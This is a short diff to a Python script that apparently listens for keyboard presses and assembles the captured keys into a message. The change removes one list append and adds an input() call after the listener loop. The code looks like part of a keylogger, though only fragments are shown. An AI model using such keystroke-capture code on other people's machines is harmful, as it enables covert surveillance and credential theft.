@@ -23,7 +23,6 @@ def verify_queue(key, tab):
                     final[-1] += " "
                 else:
                     final.append(i)
-                    final.append("")
             else:
                 final[-1] += i.split("\'")[1]
         msg = "\n".join(final)
@@ -41,3 +40,4 @@ def release(key):
 
 with Listener(on_press = on_press, on_release = release) as listener: 
     listener.join()
+    input()
